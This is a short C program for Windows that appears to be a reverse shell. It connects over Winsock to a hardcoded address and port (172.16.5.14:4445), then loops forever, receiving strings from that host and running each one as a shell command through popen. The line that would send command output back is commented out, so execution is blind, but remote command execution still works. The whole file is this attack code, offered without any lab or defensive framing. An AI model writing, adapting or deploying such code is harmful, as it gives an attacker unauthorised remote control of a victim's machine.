#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#define IP_ADDRESS "172.16.5.14"
#define PORT 4445
#define BUF_LEN 1024
#define PAYLOAD_SZ 819200


int main() {
  char prompt[15] = "Connected...";

  // Initialize Winsock and use version 2.2
  WSADATA wsaData;
  int wResult;
  WSAStartup(MAKEWORD(2,2), &wsaData);
  
  // Create a socket to connect to an IP and port
  SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  // Define socket type, AF_INET (IPv4), IP address, and port.
  struct sockaddr_in saServer;
  saServer.sin_family = AF_INET;
  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
  saServer.sin_port = htons(PORT);

  // Connect to socket
  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
  send( ConnectSocket, prompt, sizeof(prompt), 0);

  // Receive data from port;
  char buf[BUF_LEN] = "";
  int res = 0;
  FILE *output;

  do {
    //send_prompt(ConnectSocket);
    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
    output = popen(buf, "r");
    send( ConnectSocket, prompt, sizeof(prompt), 0);

    //send( ConnectSocket, (char *)output, sizeof(output), 0);
    pclose(output);
  } while (1 == 1);

  closesocket(ConnectSocket);
};

